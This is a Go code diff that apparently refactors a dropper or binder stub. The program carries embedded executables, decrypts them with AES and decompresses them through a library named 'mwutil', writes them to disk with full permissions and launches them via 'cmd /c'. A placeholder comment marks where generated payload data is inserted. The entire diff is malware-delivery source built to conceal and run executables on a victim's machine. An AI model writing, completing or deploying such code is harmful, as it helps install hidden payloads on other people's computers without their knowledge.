@@ -4,18 +4,20 @@ import (
 	"io/ioutil"
 	"os/exec"
 	"sync"
+
+	"github.com/Craumix/mwutil"
 )
 
 type exepack struct {
-	data         []byte
-	aeskey       []byte
-	filename     string
-	isencrypted  bool
-	iscompressed bool
+	data     []byte
+	filename string
 }
 
 var executables []exepack
 var wg sync.WaitGroup
+
+var iscompressed bool
+var encryptionkey []byte
 
 func main() {
 	//This comment will be replaced
@@ -36,17 +38,17 @@ func runExepack(pack exepack, path string) {
 	var err error
 	exepath := path + "/" + pack.filename
 
-	if pack.isencrypted {
-		b, err = Decrypt(pack.aeskey, b)
-		logif(err)
+	if len(encryptionkey) == 32 {
+		b, err = mwutil.AesDecrypt(encryptionkey, b)
+		mwutil.Logif(err)
 	}
-	if pack.iscompressed {
-		b, err = gUnzipData(b)
-		logif(err)
+	if iscompressed {
+		b, err = mwutil.GunzipData(b)
+		mwutil.Logif(err)
 	}
 
 	err = ioutil.WriteFile(exepath, b, 0777)
-	logif(err)
+	mwutil.Logif(err)
 
 	exec.Command("cmd", "/c", exepath)
 }
